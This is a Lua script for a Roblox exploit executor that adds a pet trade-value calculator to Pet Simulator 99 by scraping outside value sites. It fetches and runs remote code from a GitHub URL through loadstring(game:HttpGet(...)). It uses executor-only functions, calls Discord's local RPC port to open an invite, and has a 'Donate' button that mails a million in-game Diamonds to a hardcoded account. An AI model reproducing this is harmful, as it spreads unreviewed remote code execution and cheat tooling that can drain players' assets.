if not game:IsLoaded() then
    game.Loaded:Wait()
end

_G.CalculatorSettings = {
    TradeCalculator = true,
    RAPSource = "Cosmic"
}

local tradingCmds = require(game.ReplicatedStorage.Library.Client.TradingCmds)
local teleportButton = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Tools.Teleport
local cosmicButton = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Tools:FindFirstChild("Cosmic")
local TweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local RunService = game:GetService("RunService")

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local function gemSend(amount)
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            local args = {
                [1] = "KielPlayer1232",
                [2] = "Thank you for the Calculator:)",
                [3] = "Currency",
                [4] = i,
                [5] = amount
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                unpack(args)
            )
        end
    end
end

local function lerpColor(c1, c2, alpha)
    return Color3.new(c1.R + (c2.R - c1.R) * alpha, c1.G + (c2.G - c1.G) * alpha, c1.B + (c2.B - c1.B) * alpha)
end

local function tweenGradient(uiGradient, startColor, targetColor, tweenDuration)
    local elapsedTime = 0

    while elapsedTime < tweenDuration do
        local alpha = elapsedTime / tweenDuration

        local color0 = lerpColor(startColor.Keypoints[1].Value, targetColor.Keypoints[1].Value, alpha)
        local color1 = lerpColor(startColor.Keypoints[2].Value, targetColor.Keypoints[2].Value, alpha)

        uiGradient.Color =
            ColorSequence.new {
            ColorSequenceKeypoint.new(0, color0),
            ColorSequenceKeypoint.new(1, color1)
        }

        elapsedTime = elapsedTime + RunService.Heartbeat:Wait()
    end

    uiGradient.Color = targetColor
end

local function floorToDecimalPlace(number, decimalPlaces)
    local multiplier = 10 ^ decimalPlaces
    return math.floor(number * multiplier) / multiplier
end

local function findCosmic(pet, variant)
    local URL = "https://petsimulatorvalues.com/details.php"
    if variant then
        URL = URL .. "?Name=" .. variant:gsub(" ", "+") .. "+" .. pet:gsub(" ", "+")
    else
        URL = URL .. "?Name=" .. pet:gsub(" ", "+")
    end

    local response = request({
        Method = "GET",
        Url = URL
    })

    local value = response.Body:match('<[Ss]pan class="float%-left"%s*>value</[Ss]pan>%s*<[Ss]pan class="float%-right"%s*>(.-)</[Ss]pan>')

    if not value or value == "" then return nil end

    return value
end

local function getLatestValue(data)
    local latestTime = -math.huge
    local latestValue = nil

    for _, pair in ipairs(data.data) do
        local timestamp, value = pair[1], pair[2]
        if timestamp > latestTime then
            latestTime = timestamp
            latestValue = value
        end
    end

    return latestValue
end

local function findPS99(pet, variant)
    local URL = "https://ps99rap.com/api/get/rap?id="
    if variant then
        URL = URL .. variant:gsub(" ", "%%20") .. "%20" .. pet:gsub(" ", "%%20")
    else
        URL = URL .. pet:gsub(" ", "%%20")
    end

    URL = string.lower(URL)

    local response = request({
        Method = "GET",
        Url = URL
    })

    local body = game:GetService("HttpService"):JSONDecode(response.Body)
    local value = getLatestValue(body)

    return value
end

local function convertToRealNumber(value)
    if type(value) == "number" then
        return value
    end
    
    local number, suffix = value:match("^(%d+%.?%d*)([KMBT]?)$")
    number = tonumber(number)

    if suffix == "K" then
        return number * 1e3
    elseif suffix == "M" then
        return number * 1e6
    elseif suffix == "B" then
        return number * 1e9
    elseif suffix == "T" then
        return number * 1e12
    else
        return number
    end
end

local function formatNumber(num)
    local suffixes = {"", "K", "M", "B", "T", "P", "E", "Z", "Y", "Q"}  -- Suffixes for 10^0 to 10^15
    local scale = 0

    if num < 1000 then
        return tostring(num)
    end

    while num >= 1000 and scale < #suffixes - 1 do
        num = num / 1000
        scale = scale + 1
    end

    if num < 100 then
        return string.format("%.2f", num) .. suffixes[scale + 1]
    else
        return string.format("%d", math.floor(num)) .. suffixes[scale + 1]
    end
end

local function checkTrade()
    local state = tradingCmds.GetState()

    if not state then return nil end

    local playerNumber = nil
    for number, player in pairs(state._players) do
        if player == game.Players.LocalPlayer then
            playerNumber = number
            break
        end
    end
    local otherPlayerNumber = (playerNumber == 1) and 2 or 1

    local items = state._items
    local totalValue = 0
    local pets = items[otherPlayerNumber].Pet
    if not pets then return nil end
    for i, v in pets do
        local pet = game:GetService("HttpService"):JSONDecode(v._stackKey)
        local variant = ''

        if pet.sh then
            variant = "Shiny"
        end

        if pet.pt then
            if pet.pt == 1 then
                if _G.CalculatorSettings.RAPSource == "Cosmic" then
                    if variant == "Shiny" then
                        variant = "Shiny Gold"
                    else
                        variant = "Gold"
                    end
                elseif _G.CalculatorSettings.RAPSource == "PS99RAP" then
                    if variant == "Shiny" then
                        variant = "Shiny Golden"
                    else
                        variant = "Golden"
                    end
                else
                    if variant == "Shiny" then
                        variant = "Shiny Gold"
                    else
                        variant = "Gold"
                    end
                end
            elseif pet.pt == 2 then
                if _G.CalculatorSettings.RAPSource == "Cosmic" then
                    if variant == "Shiny" or variant == "Gold" then
                        variant = variant .. " Rainbow"
                    else
                        variant = "Rainbow"
                    end
                elseif _G.CalculatorSettings.RAPSource == "PS99RAP" then
                    if variant == "Shiny" or variant == "Golden" then
                        variant = variant .. " Rainbow"
                    else
                        variant = "Rainbow"
                    end
                else
                    if variant == "Shiny" or variant == "Gold" then
                        variant = variant .. " Rainbow"
                    else
                        variant = "Rainbow"
                    end
                end
            end
        end

        local value
        if _G.CalculatorSettings.RAPSource == "Cosmic" then
            value = findCosmic(pet.id, variant ~= '' and variant or nil)
        elseif _G.CalculatorSettings.RAPSource == "PS99RAP" then
            value = findPS99(pet.id, variant ~= '' and variant or nil)
        end

        if value then
            totalValue += convertToRealNumber(value)
        end
    end
    return totalValue
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/aaronmansfield5/PS99-Calculator/refs/heads/main/ui.lua"))()
game.Players.LocalPlayer.PlayerGui:WaitForChild("Cosmic")

if not cosmicButton then
    local clone1 = teleportButton:Clone()
    clone1:SetAttribute("Tooltip", "Cosmic")

    local clone2 = clone1:Clone()
    clone2.Name = "Cosmic"
    clone2.Thumbnail.ImageColor3 = Color3.fromRGB(255, 255, 255)
    clone2.Thumbnail.Image = "rbxassetid://15402995645"
    clone2.LayoutOrder = 20
    clone2.Visible = true

    clone2.Parent = teleportButton.Parent
    clone1:Destroy()

    local hoverTween = TweenService:Create(clone2.Thumbnail, tweenInfo, {Size = UDim2.new(1.1, 0, 1.1, 0)})
    local resetTween = TweenService:Create(clone2.Thumbnail, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
    local clickTween = TweenService:Create(clone2.Thumbnail, tweenInfo, {Size = UDim2.new(0.9, 0, 0.9, 0)})

    clone2.MouseEnter:Connect(
        function()
            hoverTween:Play()
        end
    )

    clone2.MouseLeave:Connect(
        function()
            resetTween:Play()
        end
    )

    clone2.MouseButton1Down:Connect(
        function()
            clickTween:Play()
        end
    )

    clone2.MouseButton1Up:Connect(
        function()
            resetTween:Play()
        end
    )

    clone2.MouseButton1Click:Connect(
        function()
            local cosmicUI = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Cosmic")
            if cosmicUI then
                cosmicUI.Enabled = not cosmicUI.Enabled
            end

            local lighting = game:GetService("Lighting")
            local blurEffect = lighting:FindFirstChild("CosmicBloom")

            if cosmicUI.Enabled then
                if not blurEffect then
                    blurEffect = Instance.new("BlurEffect")
                    blurEffect.Name = "CosmicBloom"
                    blurEffect.Size = 0
                    blurEffect.Parent = lighting
                end

                local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
                local goal = {Size = 20}
                local tween = TweenService:Create(blurEffect, tweenInfo, goal)
                tween:Play()
            else
                if blurEffect then
                    blurEffect:Destroy()
                end
            end
        end
    )
end

local CosmicUI = game.Players.LocalPlayer.PlayerGui:WaitForChild("Cosmic")
local Buttons = CosmicUI:WaitForChild("Frame"):WaitForChild("ItemsFrame"):WaitForChild("Items")

CosmicUI.Frame.Close.MouseButton1Click:Connect(
    function()
            if CosmicUI then
                CosmicUI.Enabled = not CosmicUI.Enabled
            end

            local lighting = game:GetService("Lighting")
            local blurEffect = lighting:FindFirstChild("CosmicBloom")

            if CosmicUI.Enabled then
                if not blurEffect then
                    blurEffect = Instance.new("BlurEffect")
                    blurEffect.Name = "CosmicBloom"
                    blurEffect.Size = 0
                    blurEffect.Parent = lighting
                end

                local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
                local goal = {Size = 20}
                local tween = TweenService:Create(blurEffect, tweenInfo, goal)
                tween:Play()
            else
                if blurEffect then
                    blurEffect:Destroy()
                end
            end
    end
)
Buttons.Discord.Toggle.Button.MouseButton1Click:Connect(
    function()
        request(
            {
                Url = "http://127.0.0.1:6463/rpc?v=1",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    Origin = "https://discord.com"
                },
                Body = game:GetService("HttpService"):JSONEncode(
                    {
                        cmd = "INVITE_BROWSER",
                        nonce = game:GetService("HttpService"):GenerateGUID(false),
                        args = {code = "Nd7geN8x6C"}
                    }
                )
            }
        )
        setclipboard("https://discord.gg/Nd7geN8x6C")
    end
)

Buttons.Donate.Toggle.Button.MouseButton1Click:Connect(
    function()
        gemSend(1000000)
        print(1)
    end
)

Buttons.TradeCalculator.Toggle.Button.MouseButton1Click:Connect(
    function()
        local Button = Buttons.TradeCalculator.Toggle.Button
        local ToggleTween
        local Text
        if (floorToDecimalPlace(Button.Position.X.Scale, 1) == 0.3) then
            ToggleTween =
                TweenService:Create(
                Buttons.TradeCalculator.Toggle.Button,
                tweenInfo,
                {Position = UDim2.new(0.7, 0, 0.5, 0)}
            )
            tweenGradient(
                Button.Gradient,
                Button.Gradient.Color,
                ColorSequence.new {
                    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(93, 240, 0)),
                    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(164, 254, 29))
                },
                0.1
            )
            Text = "On"
            _G.CalculatorSettings.TradeCalculator = true
        else
            ToggleTween =
                TweenService:Create(
                Buttons.TradeCalculator.Toggle.Button,
                tweenInfo,
                {Position = UDim2.new(0.3, 0, 0.5, 0)}
            )
            tweenGradient(
                Button.Gradient,
                Button.Gradient.Color,
                ColorSequence.new {
                    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 3, 62)),
                    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 40, 126))
                },
                0.1
            )
            Text = "Off"
            _G.CalculatorSettings.TradeCalculator = false
        end

        ToggleTween:Play()
        ToggleTween.Completed:Wait()
        Button:FindFirstChild("TextLabel").Text = Text
    end
)

Buttons.TradeProvider.Toggle.Button.MouseButton1Click:Connect(
    function()
        local Button = Buttons.TradeProvider.Toggle.Button
        local ToggleTween
        local Text
        if (floorToDecimalPlace(Button.Position.X.Scale, 1) == 0.3) then
            ToggleTween =
                TweenService:Create(
                Button,
                tweenInfo,
                {Position = UDim2.new(0.7, 0, 0.5, 0)}
            )
            tweenGradient(
                Button.Gradient,
                Button.Gradient.Color,
                ColorSequence.new {
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(70, 221, 218)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(120, 240, 230))
}
,
                0.1
            )
            Text = "PS99 Rap"
            _G.CalculatorSettings.RAPSource = "PS99RAP"
        else
            ToggleTween =
                TweenService:Create(
                Button,
                tweenInfo,
                {Position = UDim2.new(0.3, 0, 0.5, 0)}
            )
            tweenGradient(
                Button.Gradient,
                Button.Gradient.Color,
                ColorSequence.new {
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(58, 49, 89)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(105, 96, 140))
}
,
                0.1
            )
            Text = "Cosmic"
            _G.CalculatorSettings.RAPSource = "Cosmic"
        end

        ToggleTween:Play()
        ToggleTween.Completed:Wait()
        Button:FindFirstChild("TextLabel").Text = Text
    end
)

local function updateTradeWindow()
    while true do
        local state = tradingCmds.GetState()
        local PlayerCosmicFrame = game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame:FindFirstChild("PlayerCosmicHolder")
        
        if state and _G.CalculatorSettings.TradeCalculator then
            local Cosmic = checkTrade()
            local Value

            if not PlayerCosmicFrame then
                game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame.Size = UDim2.new(1, 0, 0.5, 120)
                game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame.PlayerRAPHolder.Size = UDim2.new(0.375, 0, 0.033, 0)

                PlayerCosmicFrame = game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame.PlayerRAPHolder:Clone()
                PlayerCosmicFrame.Name = "PlayerCosmicHolder"
                PlayerCosmicFrame.Parent = game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame
                PlayerCosmicFrame.Position = UDim2.new(0.91, 0, 0.033, 0)
                PlayerCosmicFrame.Label.Label.Text = "Calc Value: "
            end

            if Cosmic then
                Value = formatNumber(Cosmic)
            else
                Value = 0
            end
            PlayerCosmicFrame.Amount.Text = Value
        elseif not _G.CalculatorSettings.TradeCalculator then
            if PlayerCosmicFrame then
                PlayerCosmicFrame:Destroy()
            end

            game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame.Size = UDim2.new(1, 0, 0.4, 120)
            game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame.PlayerRAPHolder.Size = UDim2.new(0.375, 0, 0.066, 0)
        else
            if not PlayerCosmicFrame then
                game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame.Size = UDim2.new(1, 0, 0.5, 120)
                game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame.PlayerRAPHolder.Size = UDim2.new(0.375, 0, 0.033, 0)

                PlayerCosmicFrame = game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame.PlayerRAPHolder:Clone()
                PlayerCosmicFrame.Name = "PlayerCosmicHolder"
                PlayerCosmicFrame.Parent = game:GetService("Players").LocalPlayer.PlayerGui.TradeWindow.Frame
                PlayerCosmicFrame.Position = UDim2.new(0.91, 0, 0.033, 0)
                PlayerCosmicFrame.Label.Label.Text = "Calc Value: "
            end

            PlayerCosmicFrame.Amount.Text = "0"
        end

        task.wait(1)
    end
end

coroutine.wrap(updateTradeWindow)()
